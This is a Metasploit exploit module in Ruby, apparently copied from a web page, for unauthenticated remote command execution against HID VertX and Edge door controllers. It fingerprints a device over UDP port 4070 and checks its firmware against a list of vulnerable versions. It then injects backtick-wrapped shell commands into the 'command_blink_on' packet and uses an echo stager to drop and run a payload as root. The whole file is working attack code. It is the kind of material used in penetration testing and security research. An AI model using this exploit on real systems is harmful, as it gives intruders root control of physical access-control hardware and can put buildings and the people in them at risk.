# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;HID discoveryd command_blink_on Unauthenticated RCE&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated remote command execution
        vulnerability in the discoveryd service exposed by HID VertX and Edge
        door controllers.

        This module was tested successfully on a HID Edge model EH400
        with firmware version 2.3.1.603 (Build 04/23/2012).
      },
      &#039;Author&#039;      =>
        [
          &#039;Ricky "HeadlessZeke" Lawshae&#039;, # Discovery
          &#039;coldfusion39&#039;, # VertXploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;Platform&#039;    => &#039;linux&#039;,
      &#039;Arch&#039;        => ARCH_ARMLE,
      &#039;Privileged&#039;  => true,
      &#039;References&#039;  =>
        [
          [&#039;ZDI&#039;, &#039;16-223&#039;],
          [&#039;URL&#039;, &#039;https://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/&#039;],
          [&#039;URL&#039;, &#039;http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html&#039;],
          [&#039;URL&#039;, &#039;https://exfil.co/2016/05/09/exploring-the-hid-eh400/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/lixmk/Concierge&#039;],
          [&#039;URL&#039;, &#039;https://github.com/coldfusion39/VertXploit&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Mar 28 2016&#039;,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039;          => 30,
          &#039;CMDSTAGER::FLAVOR&#039; => &#039;echo&#039;
        },
      &#039;Targets&#039;         => [[&#039;Automatic&#039;, {}]],
      &#039;CmdStagerFlavor&#039; => &#039;echo&#039;, # wget is available, however the wget command is too long
      &#039;DefaultTarget&#039;   => 0))
    register_options [ Opt::RPORT(4070) ]
  end

  def check
    connect_udp
    udp_sock.put &#039;discover;013;&#039;
    res = udp_sock.get(5)
    disconnect_udp

    if res.to_s.eql? &#039;&#039;
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    hid_res = parse_discovered_response res
    if hid_res[:mac].eql? &#039;&#039;
      vprint_error &#039;Malformed response&#039;
      return CheckCode::Safe
    end

    @mac = hid_res[:mac]

    vprint_good "#{rhost}:#{rport} - HID discoveryd service detected"
    vprint_line hid_res.to_s
    report_service(
      host: rhost,
      mac: hid_res[:mac],
      port: rport,
      proto: &#039;udp&#039;,
      name: &#039;hid-discoveryd&#039;,
      info: hid_res
    )

    if hid_res[:version].to_s.eql? &#039;&#039;
      vprint_error "#{rhost}:#{rport} - Could not determine device version"
      return CheckCode::Detected
    end

    # Vulnerable version mappings from VertXploit
    vuln = false
    version = Gem::Version.new(hid_res[:version].to_s)
    case hid_res[:model]
    when &#039;E400&#039;     # EDGEPlus
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;EH400&#039;    # EDGE EVO
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;EHS400&#039;   # EDGE EVO Solo
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;ES400&#039;    # EDGEPlus Solo
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;V2-V1000&#039; # VertX EVO
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;V2-V2000&#039; # VertX EVO
      vuln = true if version <= Gem::Version.new(&#039;3.5.1.1483&#039;)
    when &#039;V1000&#039;    # VertX Legacy
      vuln = true if version <= Gem::Version.new(&#039;2.2.7.568&#039;)
    when &#039;V2000&#039;    # VertX Legacy
      vuln = true if version <= Gem::Version.new(&#039;2.2.7.568&#039;)
    else
      vprint_error "#{rhost}:#{rport} - Device model was not recognized"
      return CheckCode::Detected
    end

    vuln ? CheckCode::Appears : CheckCode::Safe
  end

  def send_command(cmd)
    connect_udp

    # double escaping for echo -ne stager
    encoded_cmd = cmd.gsub("\\", "\\\\\\")

    # packet length (max 44)
    len = &#039;044&#039;

    # <num> of times to blink LED, if the device has a LED; else
    # <num> second to beep (very loudly) if the device does not have a LED
    num = -1 # no beep/blink ;)

    # construct packet
    req = &#039;&#039;
    req << &#039;command_blink_on;&#039;
    req << "#{len};"
    req << "#{@mac};"
    req << "#{num}`#{encoded_cmd}`;"

    # send packet
    udp_sock.put req
    res = udp_sock.get(5)
    disconnect_udp

    unless res.to_s.start_with? &#039;ack;&#039;
      fail_with Failure::UnexpectedReply, &#039;Malformed response&#039;
    end
  end

  def execute_command(cmd, opts)
    # the protocol uses &#039;;&#039; as a separator,
    # so we issue each system command separately.
    # we&#039;re using the echo command stager which hex encodes the payload,
    # so there&#039;s no risk of replacing any &#039;;&#039; characters in the payload data.
    cmd.split(&#039;;&#039;).each do |c|
      send_command c
    end
  end

  def exploit
    print_status "#{rhost}:#{rport} - Connecting to target"

    check_code = check
    unless check_code == CheckCode::Appears || check_code == CheckCode::Detected
      fail_with Failure::Unknown, "#{rhost}:#{rport} - Target is not vulnerable"
    end

    # linemax is closer to 40,
    # however we need to account for additinal double escaping
    execute_cmdstager linemax: 30, :temp => &#039;/tmp&#039;
  end

  def parse_discovered_response(res)
    info = {}

    return unless res.start_with? &#039;discovered&#039;

    hid_res = res.split(&#039;;&#039;)
    return unless hid_res.size == 9
    return unless hid_res[0] == &#039;discovered&#039;
    return unless hid_res[1].to_i == res.length

    {
      :mac          => hid_res[2],
      :name         => hid_res[3],
      :ip           => hid_res[4],
      # ?           => hid_res[5], # &#039;1&#039;
      :model        => hid_res[6],
      :version      => hid_res[7],
      :version_date => hid_res[8]
    }
  end
end

